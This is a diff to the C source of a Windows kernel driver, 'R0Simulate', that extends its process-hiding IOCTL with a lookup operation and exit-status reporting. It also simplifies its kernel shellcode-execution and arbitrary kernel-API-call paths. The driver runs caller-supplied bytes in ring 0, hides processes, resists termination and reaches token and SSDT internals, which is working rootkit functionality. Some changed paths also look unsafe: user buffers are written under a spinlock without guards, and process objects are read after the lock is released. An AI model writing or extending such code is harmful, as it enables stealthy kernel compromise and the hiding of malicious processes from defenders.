@@ -59,12 +59,6 @@
 #define R0S_MASK_TEST(m, idx) \
     (((idx) < R0S_IOCTL_COUNT) ? (((m) >> (idx)) & 1ULL) : 0ULL)
 
-#define R0S_MASK_SET(m, idx) \
-    do { if ((idx) < R0S_IOCTL_COUNT) (m) |= (1ULL << (idx)); } while (0)
-
-#define R0S_MASK_CLR(m, idx) \
-    do { if ((idx) < R0S_IOCTL_COUNT) (m) &= ~(1ULL << (idx)); } while (0)
-
 #define R0SIMULATE_FLAG_USE_ADDRESS  0x00000001
 
 #define R0SPMS_MODE_KERNEL   0x00
@@ -73,6 +67,10 @@
 #define R0SKPH_OP_ADD      0x10
 #define R0SKPH_OP_REMOVE   0x11
 #define R0SKPH_OP_LIST     0x12
+#define R0SKPH_OP_GET      0x13
+
+#define R0SKPH_GET_EXITSTATUS  0
+#define R0SKPH_GET_EPROCESS    1
 
 #define R0SKMA_OP_READ     0
 #define R0SKMA_OP_WRITE    1
@@ -115,20 +113,6 @@
 #define R0S_ATTR_TEST(lo, hi, bit) \
     (((bit) < 64)  ? (((lo) & (1ULL << (bit))) != 0) : \
      ((bit) < 128) ? (((hi) & (1ULL << ((bit) - 64))) != 0) : FALSE)
-
-#define R0S_ATTR_SET(lo, hi, bit) \
-    do { \
-        if      ((bit) < 64)  (lo) |=  (1ULL << (bit)); \
-        else if ((bit) < 128) (hi) |=  (1ULL << ((bit) - 64)); \
-    } while (0)
-
-#define R0S_ATTR_CLR(lo, hi, bit) \
-    do { \
-        if      ((bit) < 64)  (lo) &= ~(1ULL << (bit)); \
-        else if ((bit) < 128) (hi) &= ~(1ULL << ((bit) - 64)); \
-    } while (0)
-
-#define R0S_TAG  "[R0Simulate] "
 
 #define R0S_DEBUG_TEST(idx) \
     (((idx) < R0S_IOCTL_COUNT) && \
@@ -175,6 +159,23 @@ typedef struct _PROCESS_HIDING_INPUT {
     UCHAR   Operation;
     UCHAR   Reserved[3];
 } PROCESS_HIDING_INPUT, *PPROCESS_HIDING_INPUT;
+
+typedef struct _R0S_HIDDEN_GET_OUTPUT {
+    NTSTATUS Status;
+    NTSTATUS ExitStatus;
+} R0S_HIDDEN_GET_OUTPUT, *PR0S_HIDDEN_GET_OUTPUT;
+
+typedef struct _R0S_HIDDEN_ENTRY_INFO {
+    HANDLE   Pid;
+    NTSTATUS ExitStatus;
+    ULONG    Reserved;
+} R0S_HIDDEN_ENTRY_INFO, *PR0S_HIDDEN_ENTRY_INFO;
+
+typedef struct _R0S_HIDDEN_LIST_OUTPUT {
+    ULONG  Count;
+    ULONG  Reserved;
+    R0S_HIDDEN_ENTRY_INFO Entries[1];
+} R0S_HIDDEN_LIST_OUTPUT, *PR0S_HIDDEN_LIST_OUTPUT;
 
 typedef struct _HIDDEN_PROCESS_ENTRY {
     LIST_ENTRY ListEntry;
@@ -453,7 +454,7 @@ static ULONG   g_IoctlDisable[R0S_IOCTL_COUNT] = {0};
 static ULONG   g_IoctlCount[R0S_IOCTL_COUNT]   = {0};
 static UINT64  g_IoctlHandler[R0S_IOCTL_COUNT] = {0};
 static UINT64  g_DebugMode                     = 0;
-static UINT64   g_SecureMode       = 0;
+static UINT64  g_SecureMode       = 0;
 static ULONG   g_AntiKill         = 0;
 static ULONG   g_IoctlTotalCount  = 0;
 static UINT64  g_ReadAttrDescriptor_Low   = 0;
@@ -491,22 +492,12 @@ static UINT64   g_Slot   = 0;
 
 NTKERNELAPI PPEB PsGetProcessPeb(PEPROCESS Process);
 NTKERNELAPI NTSTATUS ZwOpenProcessToken(HANDLE ProcessHandle, ACCESS_MASK DesiredAccess, PHANDLE TokenHandle);
-NTKERNELAPI NTSTATUS MmCopyVirtualMemory(PEPROCESS SourceProcess, PVOID SourceAddress, PEPROCESS TargetProcess,
-                                         PVOID TargetAddress, SIZE_T BufferSize, KPROCESSOR_MODE PreviousMode, PSIZE_T ReturnSize);
-NTKERNELAPI NTSTATUS ZwProtectVirtualMemory(HANDLE ProcessHandle, PVOID *BaseAddress, SIZE_T *RegionSize,
-                                            ULONG NewProtect, ULONG *OldProtect);
-NTKERNELAPI NTSTATUS ZwQueryInformationToken(HANDLE TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass,
-                                             PVOID TokenInformation, ULONG TokenInformationLength, ULONG *ReturnLength);
-NTKERNELAPI NTSTATUS ZwSetInformationToken(HANDLE TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass,
-                                           PVOID TokenInformation, ULONG TokenInformationLength);
 NTKERNELAPI NTSTATUS ZwSetInformationProcess(HANDLE ProcessHandle, ULONG ProcessInformationClass,
                                              PVOID ProcessInformation, ULONG ProcessInformationLength);
 NTSYSCALLAPI NTSTATUS NTAPI ZwQuerySystemInformation(ULONG SystemInformationClass, PVOID SystemInformation,
                                                      ULONG SystemInformationLength, ULONG *ReturnLength);
 NTKERNELAPI NTSTATUS ZwOpenProcess(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess,
                                    POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId);
-NTKERNELAPI NTSTATUS ZwDuplicateObject(HANDLE SourceProcessHandle, HANDLE SourceHandle, HANDLE TargetProcessHandle,
-                                       PHANDLE TargetHandle, ACCESS_MASK DesiredAccess, ULONG HandleAttributes, ULONG Options);
 NTKERNELAPI NTSTATUS ZwDuplicateToken(HANDLE ExistingTokenHandle, ACCESS_MASK DesiredAccess,
                                       POBJECT_ATTRIBUTES ObjectAttributes, BOOLEAN EffectiveOnly,
                                       TOKEN_TYPE TokenType, PHANDLE NewTokenHandle);
@@ -514,14 +505,14 @@ NTKERNELAPI NTSTATUS ZwClose(HANDLE Handle);
 NTKERNELAPI BOOLEAN SeSinglePrivilegeCheck(LUID PrivilegeValue, KPROCESSOR_MODE PreviousMode);
 NTKERNELAPI NTSTATUS IoCreateDriver(PUNICODE_STRING DriverName, PDRIVER_INITIALIZE InitializationFunction);
 NTKERNELAPI NTSTATUS PsGetProcessExitStatus(PEPROCESS Process);
+NTKERNELAPI NTSTATUS ZwQueryInformationProcess(HANDLE ProcessHandle, ULONG ProcessInformationClass,
+                                               PVOID ProcessInformation, ULONG ProcessInformationLength,
+                                               PULONG ReturnLength);
+
 NTSTATUS DriverEntry(PDRIVER_OBJECT, PUNICODE_STRING);
 VOID     DriverUnload(PDRIVER_OBJECT);
 NTSTATUS DriverCreateClose(PDEVICE_OBJECT, PIRP);
 NTSTATUS DriverDeviceControl(PDEVICE_OBJECT, PIRP);
-
-NTKERNELAPI NTSTATUS ZwQueryInformationProcess(HANDLE ProcessHandle, ULONG ProcessInformationClass,
-                                               PVOID ProcessInformation, ULONG ProcessInformationLength,
-                                               PULONG ReturnLength);
 
 NTSTATUS InitDynamicOffsets(VOID);
 NTSTATUS LazyBuildFunctionTable(VOID);
@@ -535,7 +526,6 @@ UINT64  FindKeServiceDescriptorTable(UINT64, SIZE_T);
 PVOID   GetNtdllBase(PEPROCESS);
 NAME_MAP* ParseNtdllExports(PVOID, PULONG);
 BOOLEAN SafeReadMemory(PVOID, PVOID, SIZE_T);
-BOOLEAN HasTcbPrivilege(VOID);
 VOID    UpdateAntiKill(VOID);
 
 NTSTATUS BuildWin32kSsdtTable(VOID);
@@ -550,8 +540,8 @@ static PVAR_TABLE_ENTRY FindVarByName(const WCHAR*, ULONG);
 static VOID             FreeVarTable(VOID);
 static VOID             RegisterAllVariables(VOID);
 
-NTSTATUS R0SimulateISA(PEPROCESS, PVOID, ULONG, PUINT64);
-NTSTATUS R0SimulateAPI(PVOID, ULONG, UINT64*, PVOID, ULONG, PUINT64);
+NTSTATUS R0SimulateISA(PVOID, ULONG, PUINT64);
+NTSTATUS R0SimulateAPI(PVOID, ULONG, UINT64*, PUINT64);
 NTSTATUS R0SimulateExecInstructionIoctl(PVOID, ULONG, PVOID, ULONG, ULONG_PTR*);
 NTSTATUS R0SimulateCallKernelApiIoctl(PVOID, ULONG, PVOID, ULONG, ULONG_PTR*);
 NTSTATUS R0SimulateKernelProcessHiding(PVOID, ULONG, PVOID, ULONG, ULONG_PTR*);
@@ -572,8 +562,8 @@ NTSTATUS R0SimulateArbitraryDriverCall(PVOID, ULONG, PVOID, ULONG, ULONG_PTR*);
 static BOOLEAN  R0sIsIoctlAuthorized(ULONG idx);
 static VOID     R0sFreeAuthList(VOID);
 static NTSTATUS R0sIrpCompletion(PDEVICE_OBJECT, PIRP, PVOID);
-static BOOLEAN R0sWcsEqI(const WCHAR*, const WCHAR*);
-static VOID    R0sWcsCopyN(WCHAR*, const WCHAR*, ULONG);
+static BOOLEAN  R0sWcsEqI(const WCHAR*, const WCHAR*);
+static VOID     R0sWcsCopyN(WCHAR*, const WCHAR*, ULONG);
 
 typedef UINT64 (NTAPI *PFN_0)(VOID);
 typedef UINT64 (NTAPI *PFN_1)(UINT64);
@@ -803,8 +793,7 @@ static VOID R0sBuildIndexedName(WCHAR* dst, ULONG maxChars, const WCHAR* prefix,
             while (*suffix && pos + 1 < maxChars) dst[pos++] = *suffix++;
         }
         dst[pos] = L'\0';
-    }
-    __except(EXCEPTION_EXECUTE_HANDLER) { if (dst && maxChars) dst[0] = L'\0'; }
+    } __except(EXCEPTION_EXECUTE_HANDLER) { if (dst && maxChars) dst[0] = L'\0'; }
 }
 
 static VOID RegisterAllVariables(VOID)
@@ -816,7 +805,7 @@ static VOID RegisterAllVariables(VOID)
     R0sRegisterVariable(sizeof(ULONG), (PVOID)(ULONG_PTR)&g_PrimaryTokenFrozenOffset, L"g_PrimaryTokenFrozenOffset", NULL);
     R0sRegisterVariable(sizeof(ULONG), (PVOID)(ULONG_PTR)&g_FunctionLookupMode,       L"g_FunctionLookupMode",       NULL);
     R0sRegisterVariable(sizeof(ULONG), (PVOID)(ULONG_PTR)&g_GetFunctionMode,          L"g_GetFunctionMode",          NULL);
-    
+
     for (i = 0; i < R0S_IOCTL_COUNT; i++) {
         WCHAR name[40];
         R0sBuildIndexedName(name, 40, L"g_IoctlDisable[", i, L"]");
@@ -966,16 +955,6 @@ static NTSTATUS R0sIrpCompletion(PDEVICE_OBJECT DeviceObject, PIRP Irp, PVOID Co
     return STATUS_MORE_PROCESSING_REQUIRED;
 }
 
-BOOLEAN HasTcbPrivilege(VOID)
-{
-    BOOLEAN ok = FALSE;
-    __try {
-        LUID luid = { SE_TCB_PRIVILEGE, 0 };
-        ok = SeSinglePrivilegeCheck(luid, UserMode);
-    } __except(EXCEPTION_EXECUTE_HANDLER) { ok = FALSE; }
-    return ok;
-}
-
 static NTSTATUS R0sCheckSecureMode(UINT64 mask)
 {
     LUID    luid;
@@ -1114,16 +1093,6 @@ typedef struct _LDR_DATA_TABLE_ENTRY {
 PVOID GetNtdllBase(PEPROCESS Process)
 {
     PVOID base = NULL;
-    KAPC_STATE apc;
-    BOOLEAN attached = FALSE;
-
-    if (Process == NULL) return NULL;
-
-    __try {
-        KeStackAttachProcess((PRKPROCESS)Process, &apc);
-        attached = TRUE;
-    } __except(EXCEPTION_EXECUTE_HANDLER) { attached = FALSE; }
-    if (!attached) return NULL;
 
     __try {
         PPEB peb = PsGetProcessPeb(Process);
@@ -1158,8 +1127,6 @@ PVOID GetNtdllBase(PEPROCESS Process)
         }
     } __except(EXCEPTION_EXECUTE_HANDLER) { }
 
-    __try { KeUnstackDetachProcess(&apc); }
-    __except(EXCEPTION_EXECUTE_HANDLER) { }
     return base;
 }
 
@@ -1432,21 +1399,15 @@ static UINT64 FindKeServiceDescriptorTableByOp(UINT64 start, SIZE_T range, UCHAR
                 }
             }
         }
-    } __except (EXCEPTION_EXECUTE_HANDLER) { found = 0; }
+    } __except(EXCEPTION_EXECUTE_HANDLER) { found = 0; }
     return found;
 }
 
 static PVOID GetModuleBaseByName(PEPROCESS Process, const WCHAR* targetName)
 {
     PVOID base = NULL;
-    KAPC_STATE apc;
-    BOOLEAN attached = FALSE;
 
     if (Process == NULL || targetName == NULL) return NULL;
-
-    __try { KeStackAttachProcess((PRKPROCESS)Process, &apc); attached = TRUE; }
-    __except(EXCEPTION_EXECUTE_HANDLER) { attached = FALSE; }
-    if (!attached) return NULL;
 
     __try {
         PPEB peb = PsGetProcessPeb(Process);
@@ -1485,7 +1446,6 @@ static PVOID GetModuleBaseByName(PEPROCESS Process, const WCHAR* targetName)
             }
         }
     } __except(EXCEPTION_EXECUTE_HANDLER) { }
-    __try { KeUnstackDetachProcess(&apc); } __except(EXCEPTION_EXECUTE_HANDLER) { }
     return base;
 }
 
@@ -1879,38 +1839,23 @@ NTSTATUS LazyBuildFunctionTable(VOID)
     return status;
 }
 
-NTSTATUS R0SimulateISA(PEPROCESS TargetProcess, PVOID InstructionCode,
-                       ULONG InstructionSize, UINT64 *ReturnValue)
+NTSTATUS R0SimulateISA(PVOID InstructionCode, ULONG InstructionSize, UINT64 *ReturnValue)
 {
     NTSTATUS status = STATUS_SUCCESS;
     PVOID execMem = NULL;
     UINT64 result = 0;
-    KAPC_STATE apcState;
-    BOOLEAN attached = FALSE;
 
-    if (!TargetProcess || !InstructionCode || InstructionSize == 0)
+    if (!InstructionCode || InstructionSize == 0)
         return STATUS_INVALID_PARAMETER;
 
     execMem = ExAllocatePoolWithTag(NonPagedPoolExecute, InstructionSize, '0SR0');
     if (!execMem) return STATUS_INSUFFICIENT_RESOURCES;
     RtlCopyMemory(execMem, InstructionCode, InstructionSize);
 
-    __try {
-        KeStackAttachProcess((PRKPROCESS)TargetProcess, &apcState);
-        attached = TRUE;
-    } __except(EXCEPTION_EXECUTE_HANDLER) {
+    __try { result = ((PFN_0)execMem)(); }
+    __except(EXCEPTION_EXECUTE_HANDLER) {
         status = GetExceptionCode();
-        attached = FALSE;
-    }
-
-    if (attached) {
-        __try { result = ((PFN_0)execMem)(); }
-        __except(EXCEPTION_EXECUTE_HANDLER) {
-            status = GetExceptionCode();
-            result = 0;
-        }
-        __try { KeUnstackDetachProcess(&apcState); }
-        __except(EXCEPTION_EXECUTE_HANDLER) { }
+        result = 0;
     }
 
     if (ReturnValue) *ReturnValue = result;
@@ -1918,16 +1863,12 @@ NTSTATUS R0SimulateISA(PEPROCESS TargetProcess, PVOID InstructionCode,
     return status;
 }
 
-NTSTATUS R0SimulateAPI(PVOID ApiAddress, ULONG Argc, UINT64 *Args,
-                       PVOID OutputBuffer, ULONG OutputSize, UINT64 *ReturnValue)
+NTSTATUS R0SimulateAPI(PVOID ApiAddress, ULONG Argc, UINT64 *Args, UINT64 *ReturnValue)
 {
     NTSTATUS status = STATUS_SUCCESS;
     UINT64 ret = 0;
     PVOID stackMem = NULL;
     SIZE_T stackSize = 0;
-
-    UNREFERENCED_PARAMETER(OutputBuffer);
-    UNREFERENCED_PARAMETER(OutputSize);
 
     if (!ApiAddress || Argc > 16) return STATUS_INVALID_PARAMETER;
     if (Argc > 4) {
@@ -1985,8 +1926,7 @@ NTSTATUS R0SimulateExecInstructionIoctl(PVOID InputBuffer, ULONG InputSize,
         if (InputSize < sizeof(EXEC_INSTRUCTION_INPUT) + execInput->InstructionSize - 1)
             return STATUS_BUFFER_TOO_SMALL;
 
-        status = R0SimulateISA(PsGetCurrentProcess(),
-                               execInput->Instruction,
+        status = R0SimulateISA(execInput->Instruction,
                                execInput->InstructionSize,
                                &returnValue);
 
@@ -2143,8 +2083,7 @@ NTSTATUS R0SimulateCallKernelApiIoctl(PVOID InputBuffer, ULONG InputSize,
         }
 
         if (NT_SUCCESS(status)) {
-            status = R0SimulateAPI(apiAddress, apiInput->ArgumentCount, apiInput->Arguments,
-                                   OutputBuffer, OutputSize, &returnValue);
+            status = R0SimulateAPI(apiAddress, apiInput->ArgumentCount, apiInput->Arguments, &returnValue);
             output = (PCALL_KERNEL_API_OUTPUT)OutputBuffer;
             output->ReturnValue = returnValue;
             output->Status      = status;
@@ -2214,7 +2153,8 @@ NTSTATUS R0SimulateKernelProcessHiding(PVOID InputBuffer, ULONG InputSize,
 
     pIn = (PPROCESS_HIDING_INPUT)InputBuffer;
     op = pIn->Operation;
-    if (op != R0SKPH_OP_ADD && op != R0SKPH_OP_REMOVE && op != R0SKPH_OP_LIST)
+    if (op != R0SKPH_OP_ADD && op != R0SKPH_OP_REMOVE &&
+        op != R0SKPH_OP_LIST && op != R0SKPH_OP_GET)
         return STATUS_INVALID_PARAMETER;
 
     __try {
@@ -2335,37 +2275,91 @@ NTSTATUS R0SimulateKernelProcessHiding(PVOID InputBuffer, ULONG InputSize,
             return STATUS_SUCCESS;
         }
 
+        if (op == R0SKPH_OP_GET) {
+            ULONG pid;
+            KIRQL oldIrql;
+            PHIDDEN_PROCESS_ENTRY pEntry = NULL;
+            PEPROCESS foundProc = NULL;
+            PLIST_ENTRY p;
+            PR0S_HIDDEN_GET_OUTPUT pOut;
+
+            if (InputSize < sizeof(PROCESS_HIDING_INPUT) + sizeof(ULONG))
+                return STATUS_BUFFER_TOO_SMALL;
+            if (OutputSize < sizeof(R0S_HIDDEN_GET_OUTPUT))
+                return STATUS_BUFFER_TOO_SMALL;
+
+            pid = *(ULONG*)((PUCHAR)InputBuffer + sizeof(PROCESS_HIDING_INPUT));
+            if (pid == 0) return STATUS_INVALID_PARAMETER;
+
+            KeAcquireSpinLock(&g_HiddenListLock, &oldIrql);
+            __try {
+                p = g_HiddenListHead.Flink;
+                while (p != &g_HiddenListHead) {
+                    PHIDDEN_PROCESS_ENTRY e = CONTAINING_RECORD(p, HIDDEN_PROCESS_ENTRY, ListEntry);
+                    if ((ULONG)(ULONG_PTR)e->ProcessId == pid) {
+                        pEntry = e;
+                        foundProc = e->EProcess;
+                        break;
+                    }
+                    p = p->Flink;
+                }
+            }
+            __except (EXCEPTION_EXECUTE_HANDLER) { pEntry = NULL; }
+            KeReleaseSpinLock(&g_HiddenListLock, oldIrql);
+
+            if (!pEntry) return STATUS_NOT_FOUND;
+
+            pOut = (PR0S_HIDDEN_GET_OUTPUT)OutputBuffer;
+            __try {
+                pOut->Status     = STATUS_SUCCESS;
+                pOut->ExitStatus = (foundProc != NULL)
+                                    ? PsGetProcessExitStatus(foundProc)
+                                    : STATUS_PROCESS_IS_TERMINATING;
+            }
+            __except (EXCEPTION_EXECUTE_HANDLER) { return GetExceptionCode(); }
+
+            if (Info) *Info = sizeof(R0S_HIDDEN_GET_OUTPUT);
+            return STATUS_SUCCESS;
+        }
+
         {
             ULONG maxCount = 0;
             KIRQL oldIrql;
             ULONG count = 0;
             PLIST_ENTRY pList;
+            PR0S_HIDDEN_LIST_OUTPUT pOut;
 
-            if (OutputSize >= sizeof(ULONG))
-                maxCount = (OutputSize - sizeof(ULONG)) / sizeof(HANDLE);
+            if (OutputSize < sizeof(R0S_HIDDEN_LIST_OUTPUT))
+                return STATUS_BUFFER_TOO_SMALL;
+
+            maxCount = (OutputSize - FIELD_OFFSET(R0S_HIDDEN_LIST_OUTPUT, Entries))
+                       / sizeof(R0S_HIDDEN_ENTRY_INFO);
+            pOut = (PR0S_HIDDEN_LIST_OUTPUT)OutputBuffer;
+
+            __try { pOut->Reserved = 0; }
+            __except (EXCEPTION_EXECUTE_HANDLER) { return GetExceptionCode(); }
 
             KeAcquireSpinLock(&g_HiddenListLock, &oldIrql);
             __try {
                 pList = g_HiddenListHead.Flink;
                 while (pList != &g_HiddenListHead && count < maxCount) {
                     PHIDDEN_PROCESS_ENTRY pCur = CONTAINING_RECORD(pList, HIDDEN_PROCESS_ENTRY, ListEntry);
-                    __try {
-                        ((HANDLE*)((PUCHAR)OutputBuffer + sizeof(ULONG)))[count] = pCur->ProcessId;
-                    }
-                    __except (EXCEPTION_EXECUTE_HANDLER) { break; }
+                    pOut->Entries[count].Pid        = pCur->ProcessId;
+                    pOut->Entries[count].ExitStatus = (pCur->EProcess != NULL)
+                                                        ? PsGetProcessExitStatus(pCur->EProcess)
+                                                        : STATUS_PROCESS_IS_TERMINATING;
+                    pOut->Entries[count].Reserved   = 0;
                     count++;
                     pList = pList->Flink;
                 }
             }
-            __finally {
-                KeReleaseSpinLock(&g_HiddenListLock, oldIrql);
-            }
+            __finally { KeReleaseSpinLock(&g_HiddenListLock, oldIrql); }
 
-            if (OutputSize >= sizeof(ULONG)) {
-                __try { *(ULONG*)OutputBuffer = count; }
-                __except (EXCEPTION_EXECUTE_HANDLER) { return GetExceptionCode(); }
-                if (Info) *Info = sizeof(ULONG) + count * sizeof(HANDLE);
-            } else return STATUS_BUFFER_TOO_SMALL;
+            __try { pOut->Count = count; }
+            __except (EXCEPTION_EXECUTE_HANDLER) { return GetExceptionCode(); }
+
+            if (Info) *Info = FIELD_OFFSET(R0S_HIDDEN_LIST_OUTPUT, Entries)
+                              + count * sizeof(R0S_HIDDEN_ENTRY_INFO);
             return STATUS_SUCCESS;
         }
     }
@@ -3740,8 +3734,7 @@ static VOID R0S_LogIn(ULONG code, ULONG idx, PVOID inputBuffer, ULONG inputSize)
                     { DbgPrint("R0S IN  tid=%p pid=%p func=%s <bad>\n", tid, pid, fn); break; }
                 PPROCESS_HIDING_INPUT p = (PPROCESS_HIDING_INPUT)inputBuffer;
                 ULONG targetPid = 0;
-                if ((p->Operation == R0SKPH_OP_ADD || p->Operation == R0SKPH_OP_REMOVE) &&
-                    inputSize >= sizeof(PROCESS_HIDING_INPUT) + sizeof(ULONG)) {
+                if (inputSize >= sizeof(PROCESS_HIDING_INPUT) + sizeof(ULONG)) {
                     targetPid = *(ULONG*)((PUCHAR)inputBuffer + sizeof(PROCESS_HIDING_INPUT));
                 }
                 DbgPrint("R0S IN  tid=%p pid=%p func=%s op=0x%X targetPid=%u\n",
@@ -4053,7 +4046,7 @@ NTSTATUS DriverDeviceControl(PDEVICE_OBJECT DeviceObject, PIRP Irp)
         inputBuffer  = irpSp->Parameters.DeviceIoControl.Type3InputBuffer;
         outputBuffer = Irp->UserBuffer;
     }
-    
+
     if (g_RateLimitEnable > 0) {
         __try {
             KIRQL   oldIrql;
@@ -4093,20 +4086,17 @@ NTSTATUS DriverDeviceControl(PDEVICE_OBJECT DeviceObject, PIRP Irp)
 
         if (idx >= R0S_IOCTL_COUNT) { status = STATUS_INVALID_DEVICE_REQUEST; __leave; }
 
-        
         if (g_IoctlDisable[idx] == 1) { status = STATUS_ACCESS_DENIED; __leave; }
-        
+
         if (g_SecureMode != 0) {
             status = R0sCheckSecureMode(g_SecureMode);
             if (!NT_SUCCESS(status)) { __leave; }
         }
 
-        
         if (!R0sIsIoctlAuthorized(idx)) { status = STATUS_ACCESS_DENIED; __leave; }
 
-        
         handler = (PFN_IOCTL_HANDLER)(ULONG_PTR)g_IoctlHandler[idx];
-        
+
         __try {
             status = handler(inputBuffer, inputSize, outputBuffer, outputSize, &info);
         } __except (EXCEPTION_EXECUTE_HANDLER) {
@@ -4215,8 +4205,6 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
         InitializeListHead(&g_AuthListHead);
         KeInitializeSpinLock(&g_AuthListLock);
         g_AuthMode = 0;
-
-        
         g_AuthDefaultMask = 0;
 
         KeInitializeSpinLock(&g_RateLock);
